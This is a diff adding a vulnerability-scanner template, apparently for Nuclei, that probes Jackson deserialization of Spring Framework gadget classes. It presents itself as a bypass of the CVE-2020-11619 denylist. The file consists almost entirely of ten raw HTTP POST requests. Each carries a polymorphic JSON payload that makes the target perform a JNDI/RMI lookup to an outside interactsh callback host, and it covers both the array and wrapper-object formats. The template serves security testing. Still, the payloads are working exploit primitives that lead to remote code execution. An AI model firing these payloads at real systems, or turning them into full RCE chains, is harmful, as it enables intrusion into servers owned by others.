@@ -1,0 +1,197 @@
+id: spring-extended-gadgets-deserialization-rce
+
+info:
+  name: Spring Extended BeanFactory Gadgets - RCE (CVE-2020-11619 Bypass)
+  author: Rin Le from Secuwall (trinhtu.kma@gmail.com)
+  severity: high
+  description: |
+    Extended gadget classes in Spring Framework that inherit from
+    AbstractBeanFactoryBasedTargetSource. All share the same
+    BeanFactoryAware → setBeanFactory() → getBean() pattern.
+    None are in Jackson's SubTypeValidator denylist.
+
+    This template covers gadgets NOT in the primary template:
+      - LazyInitTargetSource (getTarget)
+      - PrototypeTargetSource (newPrototypeInstance)
+      - ThreadLocalTargetSource (getTarget)
+      - CommonsPool2TargetSource (createObject)
+
+    Also covers WRAPPER_OBJECT JSON format for all 6 gadgets
+    (activateDefaultTyping with As.WRAPPER_OBJECT).
+  classification:
+    cwe-id: CWE-502
+    cvss-score: 8.1
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+  tags: jackson,deserialization,rce,spring,oob,jndi,denylist-bypass
+  metadata:
+    max-request: 10
+
+http:
+  # ──────────────────────────────────────────────────────────────
+  # Gadget C: LazyInitTargetSource
+  #   Trigger: getTarget() → getBeanFactory().getBean()
+  # ──────────────────────────────────────────────────────────────
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["org.springframework.aop.target.LazyInitTargetSource",{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/c","beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/c"]}]}]
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  # ──────────────────────────────────────────────────────────────
+  # Gadget D: PrototypeTargetSource
+  #   Trigger: newPrototypeInstance() → getBeanFactory().getBean()
+  # ──────────────────────────────────────────────────────────────
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["org.springframework.aop.target.PrototypeTargetSource",{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/d","beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/d"]}]}]
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  # ──────────────────────────────────────────────────────────────
+  # Gadget E: ThreadLocalTargetSource
+  #   Trigger: getTarget() → getBeanFactory().getBean()
+  # ──────────────────────────────────────────────────────────────
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["org.springframework.aop.target.ThreadLocalTargetSource",{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/e","beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/e"]}]}]
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  # ──────────────────────────────────────────────────────────────
+  # Gadget F: CommonsPool2TargetSource
+  #   Trigger: createObject() → getBeanFactory().getBean()
+  # ──────────────────────────────────────────────────────────────
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["org.springframework.aop.target.CommonsPool2TargetSource",{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/f","beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/f"]}]}]
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  # ──────────────────────────────────────────────────────────────
+  # WRAPPER_OBJECT format — As.WRAPPER_OBJECT
+  # {"className": {props}} instead of ["className", {props}]
+  #
+  # Used when: activateDefaultTyping(..., As.WRAPPER_OBJECT)
+  # ──────────────────────────────────────────────────────────────
+
+  # All 6 gadgets in WRAPPER_OBJECT format
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"org.springframework.aop.config.SimpleBeanFactoryAwareAspectInstanceFactory":{"aspectBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-a","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-a"]}}}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"org.springframework.aop.target.SimpleBeanTargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-b","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-b"]}}}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"org.springframework.aop.target.LazyInitTargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-c","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-c"]}}}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"org.springframework.aop.target.PrototypeTargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-d","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-d"]}}}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"org.springframework.aop.target.ThreadLocalTargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-e","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-e"]}}}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"org.springframework.aop.target.CommonsPool2TargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-f","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-f"]}}}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
